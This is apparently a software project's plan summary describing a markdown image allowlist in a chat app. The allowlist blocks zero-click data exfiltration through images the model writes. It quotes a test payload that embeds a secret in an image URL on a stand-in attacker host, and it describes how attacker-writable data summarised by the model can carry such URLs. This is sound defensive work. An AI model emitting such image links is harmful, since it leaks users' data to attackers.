# Phase 5.1 Plan 11: Markdown image allowlist (A-10) Summary

**With `NEXT_PUBLIC_RAG_IMAGE_ALLOWLIST=true`, a markdown image the model writes loads by itself only from the deployment's own image hosts. An image from any other host renders as a link that fetches nothing until someone clicks it. That closes the zero-click exfiltration channel from research F-11.**

## Accomplishments

- **Task 1, the allowlist helper.** `src/lib/safe-image-hosts.ts` contains:
  - `allowedImageHosts({supabaseUrl, headerLogoUrl, aiLogoUrl})`. It returns lower-cased hosts, removes duplicate logo hosts, and ignores empty or unparsable values.
  - `isAllowedImageUrl(src, hosts = deployment hosts)`. Hosts are matched exactly; no regex runs on hosts. The URL API normalises the path, so `/public/../sign/` and `%2e%2e` cannot escape the public storage prefix. The deployment hosts are derived lazily from the three `NEXT_PUBLIC_*` variables, the same way `next.config.js` derives them.
  - `imageLinkHref(src)`, which decides whether a blocked image can become a link.
- **Task 2, the renderers.** An `img` entry is added only when the switch is on, in three places:
  - the `markdownComponents` `useMemo` in `chat-message.tsx`. No new memo was added and the dependencies are unchanged.
  - the tool-result `ReactMarkdown` in `ToolInvocation`. Its components moved unchanged to the module-level `TOOL_RESULT_MARKDOWN_COMPONENTS`.
  - `INITIAL_COMPONENTS` in `markdown.tsx`, written in that file's double-quote, no-semicolon style.

  Allowed images render as `<img src alt title referrerPolicy="no-referrer" loading="lazy">`. Blocked links use each renderer's existing link colours, plus `break-all`.
- **`source_images` is unchanged.** It is rendered by `SourceImagesGrid` outside markdown, so AGENTS.md section 14 behaviour is preserved.

## Tests that failed before the change

- `tests/lib/safe-image-hosts.test.ts`: every rejection case. The look-alike host, userinfo, port, protocol-relative, backslash, `data:`, `javascript:`, `blob:`, the signed storage path and path traversal were all accepted by the stub.
- `tests/ui/markdown-image-allowlist.test.ts`: with the switch on, `![alt](https://attacker.example/x.png?q=secret)` rendered an `<img>` in chat-message and markdown.tsx, and allowed images lacked `referrerPolicy` and `loading`. Against the old `chat-message.tsx`, the tool-result suite also fails.

## Other react-markdown users (left unchanged, as the plan says)

- `src/components/ui/mcp-tool-box.tsx` renders `formattedResult.markdown`, the formatted output of an MCP tool. That is tool or third-party data, not text the assistant writes, but it can contain attacker-chosen image URLs. It has no img override and is left for a follow-up (Deferred).
- `src/components/ui/mcp-tools-button.tsx` renders MCP tool descriptions from the server configuration. That is operator-configured text, not model text.

## Deviations from Plan

1. **[Rule 2, missing critical security] The tool-result renderer in `chat-message.tsx` is guarded too.** PATTERNS.md asked us to check whether `ToolInvocation`'s inner `ReactMarkdown` renders assistant text. It does: tool results can be model-written summaries of attacker-writable data, such as the Gmail summary in `chat/approve`. It uses the same switch-off identity. Its components moved to an exported module-level constant so the test can render them; that object no longer allocates on every render, and its behaviour is otherwise the same.
2. **Same-origin is root-relative only.** `x.png` (no leading slash) is rejected. This is stricter than "relative paths" and matches the plan's example `/api/files/x.png`.
3. **replicate.delivery is limited to `/xezq/`**, mirroring `next.config.js`. This is stricter than the must-have wording "https replicate.delivery"; the plan's own test URL uses `/xezq/`.
4. **Extra export `imageLinkHref`.** Without it, a blocked `data:` or `javascript:` source would get an `href`. Such a source renders as text instead.

## Known limitation

A linked image, `[![alt](x)](y)`, with a blocked source now renders an `<a>` inside an `<a>`. The browser still fetches nothing; the only cost is invalid nesting.
